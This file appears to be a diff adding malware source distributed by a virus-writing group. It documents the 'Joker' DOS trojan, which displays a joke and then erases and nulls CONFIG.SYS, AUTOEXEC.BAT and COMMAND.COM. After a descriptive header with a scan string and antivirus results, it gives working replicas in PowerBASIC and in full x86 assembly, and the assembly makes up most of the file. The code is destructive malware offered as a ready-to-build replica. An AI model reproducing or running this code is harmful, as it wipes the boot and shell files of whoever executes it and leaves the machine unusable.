@@ -1,0 +1,159 @@
+   ;
+   ;           ÛÛÛÛÛÛÛ     Û        Û  ÛÛÛÛÛÛÛÛÛ  Û ÛÛÛÛÛÛÛÛ
+   ;          Û       Û    Û        Û  Û          ÛÛÛ     ÛÛ
+   ;         Û         Û   Û        Û  Û          Û       ÛÛ
+   ;         ÛÛÛÛÛÛÛÛÛÛÛ   Û        Û  Û          Û
+   ;         Û         Û   Û        Û  Û          Û
+   ;         Û         Û    Û      Û   Û          Û
+   ;         Û         Û     ÛÛÛÛÛÛ    ÛÛÛÛÛÛÛÛÛ  Û
+   ;
+   ;
+   ;
+   ;       ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ   Û      Û  ÛÛÛÛÛ   Û    Û    ÛÛÛÛÛ    Û
+   ;       Û    Û       Û  Û      Û  Û    Û  ÛÛ   Û   Û     Û   Û
+   ;       Û    Û       Û  Û      Û  ÛÛÛÛÛ   Û Û  Û  Û       Û  Û
+   ;       Û     Û    Û       Û  Û      Û  Û  Û    Û  Û Û  ÛÛÛÛÛÛÛÛÛ  Û
+   ;       Û     Û    Û       Û  Û      Û  Û   Û   Û   ÛÛ  Û       Û  Û
+   ;        ÛÛÛÛÛ      ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   Û    Û  Û    Û  Û       Û  ÛÛÛÛÛÛ
+   ;
+   ;
+   ;        Distributed By The American Virus Creation and Research Society
+   ; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   ; -------------------------------------------------------------------
+   ; Name of Trojan: Joker Trojan
+   ; -------------------------------------------------------------------
+   ; Alias: Funny, Happy
+   ; -------------------------------------------------------------------
+   ; Type of code: Trojan
+   ; -------------------------------------------------------------------
+   ; VSUM Information - (NONE)
+   ; -------------------------------------------------------------------
+   ; Scan String -
+   ; 2E 8C 1E 80 00 2E C7 06 7E 00 00 00 E8 06 01 E8 4E 04 25 DF FF 2E
+   ; -------------------------------------------------------------------
+   ; Antivirus information:
+   ; Tbav:   Unscannable
+   ; FPROT:  Unscannable
+   ; McAfee: Unscannable
+   ; CPAV:   Unscannable
+   ; -------------------------------------------------------------------
+   ; Execution results:
+   ;   Upon execution the Jokes trojan displays the following text:
+   ; "WHY DID THE CHICKEN CROSS THE RODE?"
+   ; "ANSWER: TO GET TO THE OTHER SIDE?"
+   ; "SINCE THIS PROGRAM SUCKS RIGHT NOW YOU DO NOT HAVE TO"
+   ; "REGISTER IT.  THANKS FOR USING THIS KEEN PROGRAM"
+   ;   After it has displayed this text, jokes proceeds to erase the
+   ; computers CONFIG.SYS, AUTOEXEC.BAT, and COMMAND.COM.  Upon erasure,
+   ; jokes creates a nulled version of the erased programs with hidden\
+   ; system\read-only attributes.
+   ; --------------------------------------------------------------------
+   ; Cleaning RECOMENDATIONS:
+   ;   Trojans are one time items, so when run there is no stopping
+   ; it.
+   ; -------------------------------------------------------------------
+   ;           Disassembly:
+   ;   *NOTE* The Jokes Trojan was written in a high level language,
+   ; and because of the compiler directives added to the disassembled version,
+   ; the language was most likely a form of BASIC.  According to AVCR Researcher
+   ; MAS, a good replica of the JOKES trojan would be as follows:
+   ;
+   ;           PowerBASIC:
+   ;
+   ; ATTRIB "C:\AUTOEXEC.BAT",0
+   ; SHELL "ERASE C:\AUTOEXEC.BAT"
+   ; OPEN "C:\AUTOEXEC.BAT" FOR OUTPUT AS #1
+   ; CLOSE #1
+   ; ATTRIB "C:\AUTOEXEC.BAT",7
+   ; ATTRIB "C:\CONFIG.SYS",0
+   ; SHELL "ERASE C:\CONFIG.SYS"
+   ; OPEN "C:\CONFIG.SYS" FOR OUTPUT AS #1
+   ; CLOSE #1
+   ; ATTRIB "C:\CONFIG.SYS",7
+   ; ATTRIB "C:\COMMAND.COM",0
+   ; SHELL "ERASE C:\COMMAND.COM"
+   ; OPEN "C:\COMMAND.COM" FOR OUTPUT AS #1
+   ; CLOSE #1
+   ; ATTRIB "C:\COMMAND.COM",7
+   ; PRINT "WHY DID THE CHICKEN CROSS THE RODE?"
+   ; PRINT "ANSWER: TO GET TO THE OTHER SIDE?"
+   ; PRINT "SINCE THIS PROGRAM SUCKS RIGHT NOW YOU DO NOT HAVE TO"
+   ; PRINT "REGISTER IT.  THANKS FOR USING THIS KEEN PROGRAM"
+   ;
+   ;   *NOTE* According to AVCR Researcher Th* Patron a good ASM replica
+   ; would be as follows:
+
+   .model  tiny
+   .code
+   code    segment
+   assume  cs:code,es:code
+   org     100h
+   Start:  JMP     Begin
+   dir     db      'C:\',0
+   com     db      'C:\COMMAND.COM',0
+   bat     db      'C:\AUTOEXEC.BAT',0
+   sys     db      'C:\CONFIG.SYS',0
+
+
+   Begin:
+   mov     ah,3bh
+   mov     dx,offset dir
+   int     21h
+   jc      end
+   mov     ah,43h
+   mov     al,01h
+   xor     cx,cx
+   mov     dx,offset com
+   int     21h
+   jc      end
+   mov     ah,43h
+   mov     al,01h
+   xor     cx,cx
+   mov     dx,offset bat
+   int     21h
+   jc      end
+   mov     ah,43h
+   mov     al,01h
+   xor     cx,cx
+   mov     dx,offset sys
+   int     21h
+   jc      end
+   mov     ah,41h
+   mov     dx,offset com
+   int     21h
+   jc      end
+   mov     ah,41h
+   mov     dx,offset bat
+   int     21h
+   jc      end
+   mov     ah,41h
+   mov     dx,offset sys
+   int     21h
+   jc      end
+   mov     ah,3Ch
+   mov     cx,0111b
+   mov     dx,offset com
+   int     21h
+   jc      end
+   mov     ah,3Eh
+   mov     bx,ax
+   int     21h
+   mov     ah,3Ch
+   mov     cx,0111b
+   mov     dx,offset bat
+   int     21h
+   jc      end
+   mov     ah,3Eh
+   mov     bx,ax
+   int     21h
+   mov     ah,3Ch
+   mov     cx,0111b
+   mov     dx,offset sys
+   int     21h
+   jc      end
+   mov     ah,3Eh
+   mov     bx,ax
+   int     21h
+   end:
+   code    ends
+       end     Start
